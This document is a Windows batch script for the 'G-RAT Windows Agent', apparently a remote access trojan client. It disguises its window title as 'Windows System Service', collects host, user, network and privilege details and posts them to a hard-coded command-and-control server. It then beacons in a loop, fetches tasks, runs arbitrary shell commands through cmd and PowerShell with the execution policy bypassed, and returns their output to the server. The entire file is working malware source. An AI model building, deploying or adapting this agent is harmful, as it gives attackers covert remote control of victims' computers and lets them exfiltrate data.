@echo off
setlocal EnableDelayedExpansion
title Windows System Service
color 0a

:: Set Configuration
set "C2_SERVER=http://192.168.18.173:8080"
set "BEACON_INTERVAL=60"
set "AGENT_ID="
set "DEBUG=true"

:: Check for admin rights
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Warning: Not running with administrator privileges
    echo [!] Some system information and commands may not work properly
) else (
    echo [+] Running with administrator privileges
)

:: Generate a unique agent ID
for /f "tokens=2 delims=[]" %%a in ('ver') do set "WIN_VER=%%a"
for /f %%a in ('wmic csproduct get uuid ^| findstr -v UUID') do set "UUID=%%a"
for /f %%a in ('wmic bios get serialnumber ^| findstr -v Serial') do set "SERIAL=%%a"
set "AGENT_ID=%COMPUTERNAME%-%UUID:~0,8%-%RANDOM%"

echo [+] G-RAT Windows Agent
echo [+] Agent ID: %AGENT_ID%
echo [+] C2 Server: %C2_SERVER%

:: Create a temporary PowerShell script for system info collection
echo function Get-SystemInfo { > "%TEMP%\grat_sysinfo.ps1"
echo   $ComputerInfo = Get-CimInstance Win32_ComputerSystem >> "%TEMP%\grat_sysinfo.ps1"
echo   $OSInfo = Get-CimInstance Win32_OperatingSystem >> "%TEMP%\grat_sysinfo.ps1"
echo   $CPUInfo = Get-CimInstance Win32_Processor >> "%TEMP%\grat_sysinfo.ps1"
echo   $IPConfig = Get-NetIPAddress ^| Where-Object {$_.AddressFamily -eq "IPv4" -and $_.IPAddress -ne "127.0.0.1"} >> "%TEMP%\grat_sysinfo.ps1"
echo   $AdminStatus = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) >> "%TEMP%\grat_sysinfo.ps1"
echo   $MAC = (Get-NetAdapter ^| Where-Object {$_.Status -eq "Up"} ^| Select-Object -First 1).MacAddress >> "%TEMP%\grat_sysinfo.ps1"
echo   $MemoryGB = [math]::Round($OSInfo.TotalVisibleMemorySize / 1MB, 2) >> "%TEMP%\grat_sysinfo.ps1"
echo   >> "%TEMP%\grat_sysinfo.ps1"
echo   $SystemInfo = @{ >> "%TEMP%\grat_sysinfo.ps1"
echo     Hostname = $env:COMPUTERNAME >> "%TEMP%\grat_sysinfo.ps1"
echo     OS = $OSInfo.Caption >> "%TEMP%\grat_sysinfo.ps1"
echo     Architecture = $env:PROCESSOR_ARCHITECTURE >> "%TEMP%\grat_sysinfo.ps1"
echo     Username = $env:USERNAME >> "%TEMP%\grat_sysinfo.ps1"
echo     WindowsVersion = $OSInfo.Version >> "%TEMP%\grat_sysinfo.ps1"
echo     Processor = $CPUInfo.Name >> "%TEMP%\grat_sysinfo.ps1"
echo     Memory = "$MemoryGB GB" >> "%TEMP%\grat_sysinfo.ps1"
echo     IsAdmin = $AdminStatus >> "%TEMP%\grat_sysinfo.ps1"
echo     IPAddress = ($IPConfig ^| Select-Object -First 1).IPAddress >> "%TEMP%\grat_sysinfo.ps1"
echo     MACAddress = $MAC >> "%TEMP%\grat_sysinfo.ps1"
echo   } >> "%TEMP%\grat_sysinfo.ps1"
echo   return $SystemInfo ^| ConvertTo-Json -Compress >> "%TEMP%\grat_sysinfo.ps1"
echo } >> "%TEMP%\grat_sysinfo.ps1"
echo Get-SystemInfo >> "%TEMP%\grat_sysinfo.ps1"

:: Collect system information using PowerShell
echo [+] Collecting system information...
for /f "usebackq delims=" %%a in ('powershell -ExecutionPolicy Bypass -File "%TEMP%\grat_sysinfo.ps1"') do set "SYSTEM_INFO=%%a"

:: Try to get external IP address
echo [+] Getting external IP address...
for /f "usebackq delims=" %%a in ('powershell -ExecutionPolicy Bypass -Command "(Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing).Content"') do set "EXT_IP=%%a"

:: Create a registration payload
echo [+] Preparing agent registration...
echo {"id":"%AGENT_ID%","ip":"%EXT_IP%","system_info":%SYSTEM_INFO%} > "%TEMP%\registration.json"

:: Register with C2 server
echo [+] Registering with C2 server...
powershell -ExecutionPolicy Bypass -Command "$registration = Get-Content '%TEMP%\registration.json'; Invoke-RestMethod -Uri '%C2_SERVER%/api/register' -Method Post -Body $registration -ContentType 'application/json'"

if %errorlevel% neq 0 (
    echo [!] Registration failed. Retrying in 30 seconds...
    timeout /t 30 /nobreak >nul
    powershell -ExecutionPolicy Bypass -Command "$registration = Get-Content '%TEMP%\registration.json'; Invoke-RestMethod -Uri '%C2_SERVER%/api/register' -Method Post -Body $registration -ContentType 'application/json'"
    
    if %errorlevel% neq 0 (
        echo [!] Registration failed again. Exiting.
        goto cleanup
    )
)

echo [+] Successfully registered with C2 server
echo [+] Starting beacon loop (interval: %BEACON_INTERVAL% seconds)


:: Setup for task execution
echo function Execute-Command { param([string]$command) > "%TEMP%\grat_executor.ps1"
echo   try { >> "%TEMP%\grat_executor.ps1"
echo     $output = cmd /c $command 2^>^&1 >> "%TEMP%\grat_executor.ps1"
echo     $exitCode = $LASTEXITCODE >> "%TEMP%\grat_executor.ps1"
echo     return @{ >> "%TEMP%\grat_executor.ps1"
echo       Output = $output >> "%TEMP%\grat_executor.ps1"
echo       Error = "" >> "%TEMP%\grat_executor.ps1"
echo       ExitCode = $exitCode >> "%TEMP%\grat_executor.ps1"
echo     } ^| ConvertTo-Json -Compress >> "%TEMP%\grat_executor.ps1"
echo   } catch { >> "%TEMP%\grat_executor.ps1"
echo     return @{ >> "%TEMP%\grat_executor.ps1"
echo       Output = "" >> "%TEMP%\grat_executor.ps1"
echo       Error = $_.Exception.Message >> "%TEMP%\grat_executor.ps1"
echo       ExitCode = 1 >> "%TEMP%\grat_executor.ps1"
echo     } ^| ConvertTo-Json -Compress >> "%TEMP%\grat_executor.ps1"
echo   } >> "%TEMP%\grat_executor.ps1"
echo } >> "%TEMP%\grat_executor.ps1"

:: Main beacon loop
:beacon_loop
echo [+] Sending beacon...
powershell -ExecutionPolicy Bypass -Command "$beaconData = @{agent_id='%AGENT_ID%'} ^| ConvertTo-Json; Invoke-RestMethod -Uri '%C2_SERVER%/api/beacon' -Method Post -Body $beaconData -ContentType 'application/json' -ErrorAction SilentlyContinue"

echo [+] Getting tasks...
for /f "usebackq delims=" %%a in ('powershell -ExecutionPolicy Bypass -Command "(Invoke-RestMethod -Uri '%C2_SERVER%/api/task?agent_id=%AGENT_ID%' -ErrorAction SilentlyContinue ^| ConvertTo-Json -Compress)"') do set "TASK=%%a"

:: Process task if not noop
echo %TASK% ^| findstr /C:"noop" >nul
if %errorlevel% neq 0 (
    if defined TASK (
        for /f "tokens=2 delims=:, usebackq" %%a in ('echo %TASK% ^| findstr /C:"id"') do set "TASK_ID=%%a"
        set "TASK_ID=!TASK_ID:~1,-1!"
        
        for /f "tokens=2 delims=:, usebackq" %%a in ('echo %TASK% ^| findstr /C:"type"') do set "TASK_TYPE=%%a"
        set "TASK_TYPE=!TASK_TYPE:~1,-1!"
        
        for /f "tokens=2 delims=:, usebackq" %%a in ('echo %TASK% ^| findstr /C:"command"') do set "TASK_COMMAND=%%a"
        set "TASK_COMMAND=!TASK_COMMAND:~1,-1!"
        
        echo [+] Received task: !TASK_TYPE! - !TASK_COMMAND!
        
        if "!TASK_TYPE!"=="terminate" (
            echo [+] Terminating agent...
            goto cleanup
        )
        
        if "!TASK_TYPE!"=="shell" (
            echo [+] Executing command: !TASK_COMMAND!
            
            :: Execute the command using PowerShell
            echo param([string]$command) > "%TEMP%\grat_task.ps1"
            echo . "%TEMP%\grat_executor.ps1" >> "%TEMP%\grat_task.ps1"
            echo $result = Execute-Command -command $command >> "%TEMP%\grat_task.ps1"
            echo $resultJson = $result >> "%TEMP%\grat_task.ps1"
            echo $resultObj = $resultJson ^| ConvertFrom-Json >> "%TEMP%\grat_task.ps1"
            echo $sendResult = @{ >> "%TEMP%\grat_task.ps1"
            echo   agent_id = '%AGENT_ID%' >> "%TEMP%\grat_task.ps1"
            echo   task_id = '%TASK_ID%' >> "%TEMP%\grat_task.ps1"
            echo   output = $resultObj.Output >> "%TEMP%\grat_task.ps1"
            echo   error = $resultObj.Error >> "%TEMP%\grat_task.ps1"
            echo   exit_code = $resultObj.ExitCode >> "%TEMP%\grat_task.ps1"
            echo   start_time = [Math]::Round((Get-Date -UFormat %%s)) >> "%TEMP%\grat_task.ps1"
            echo   finish_time = [Math]::Round((Get-Date -UFormat %%s)) >> "%TEMP%\grat_task.ps1"
            echo } >> "%TEMP%\grat_task.ps1"
            echo $sendResultJson = $sendResult ^| ConvertTo-Json -Compress >> "%TEMP%\grat_task.ps1"
            echo $sendResultJson >> "%TEMP%\grat_task.ps1"
            echo Invoke-RestMethod -Uri '%C2_SERVER%/api/result' -Method Post -Body $sendResultJson -ContentType 'application/json' >> "%TEMP%\grat_task.ps1"
            
            for /f "usebackq delims=" %%b in ('powershell -ExecutionPolicy Bypass -File "%TEMP%\grat_task.ps1" -command "!TASK_COMMAND!"') do (
                echo [+] Command result: %%b
            )
        )
    )
)

echo [+] Sleeping for %BEACON_INTERVAL% seconds...
timeout /t %BEACON_INTERVAL% /nobreak >nul
goto beacon_loop

:cleanup
echo [+] Cleaning up temporary files...
del /q /f "%TEMP%\grat_sysinfo.ps1" 2>nul
del /q /f "%TEMP%\registration.json" 2>nul
del /q /f "%TEMP%\grat_executor.ps1" 2>nul
del /q /f "%TEMP%\grat_task.ps1" 2>nul
echo [+] Agent terminated
endlocal
